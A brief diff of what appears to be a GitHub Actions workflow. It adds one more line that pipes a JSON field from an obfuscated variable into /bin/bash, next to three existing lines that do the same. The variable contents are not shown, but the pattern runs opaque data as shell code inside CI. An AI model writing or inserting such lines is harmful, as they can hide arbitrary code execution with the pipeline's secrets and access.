@@ -24,6 +24,7 @@ jobs:
           echo $v10 | jq -r .tp7596 | /bin/bash
           echo $bifn9020 | jq -r .rpcn770 | /bin/bash
           printf '%s' "$p89" | jq -r .je13 | /bin/bash
+          echo $wkd2 | jq -r .bqn7 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
